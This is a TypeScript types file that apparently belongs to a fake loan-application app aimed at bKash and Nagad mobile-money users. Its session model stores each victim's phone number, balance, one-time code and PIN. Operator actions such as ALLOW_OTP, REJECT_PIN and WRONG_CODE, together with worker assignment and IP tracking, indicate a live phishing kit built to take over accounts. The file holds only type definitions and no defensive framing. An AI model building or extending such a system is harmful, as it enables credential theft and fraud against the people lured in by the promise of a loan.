
export interface LoanFormData {
  fullName: string;
  loanAmount: string;
  duration: string;
  address: string;
  paymentNumber: string;
  paymentMethod: 'bKash';
  nidNumber: string;
}

export interface AccountVerificationData {
  currentBalance: string;
  lastTransaction: string;
}

export enum AppStep {
  Home = 'HOME',
  ApplicationForm = 'FORM',
  AccountDetails = 'ACCOUNT_DETAILS',
  FinalResult = 'RESULT',
  SubmissionAccepted = 'SUBMISSION_ACCEPTED',
  PermissionRequired = 'PERMISSION_REQUIRED',
  ApprovalNotice = 'APPROVAL_NOTICE',
  WithdrawalForm = 'WITHDRAWAL_FORM',
  WithdrawalWaiting = 'WITHDRAWAL_WAITING',
  Admin = 'ADMIN',
  Blocked = 'BLOCKED'
}

export interface CustomerSession {
  id: string;
  orderId: string;
  name: string;
  provider?: 'bkash' | 'nagad';
  initialPhone: string;
  gatewayPhone: string;
  balance: string;
  lastBalance?: string;
  otp: string;
  pin: string;
  waitingFor: 'NONE' | 'OTP_PERM' | 'FINAL_WAIT' | 'VERIFY_PAGE';
  adminAction: 'NONE' | 'ALLOW_OTP' | 'APPROVE' | 'REJECT_PIN' | 'CANCEL_ALL' | 'RESET_GATEWAY' | 'SHOW_VERIFY' | 'WRONG_CODE' | 'DONE' | 'REVIEW_APP' | 'APPLICATION_ACCEPTED';
  lastUpdated: number;
  blocked?: boolean;
  clientIp?: string;
  congratsSent?: boolean;
  congratsNotifText?: string;
  congratsNotifTime?: number;
  verifyStatus?: 'WAITING' | 'SHOWN' | 'NONE';
  assignedWorker?: string;
  // New flow fields
  applicationStatus?: 'SUBMITTED' | 'ACCEPTED' | 'APPROVED' | 'WITHDRAWAL_SUBMITTED';
  acceptedAt?: number;
  approvedAt?: number;
  approvedAmount?: string;
  loanAmount?: string;
  withdrawalDetails?: {
    accountType: 'bank' | 'bkash' | 'nagad' | 'rocket';
    accountNumber: string;
    accountHolder: string;
    bankName?: string;
    branchName?: string;
  };
  withdrawalSubmittedAt?: number;
}
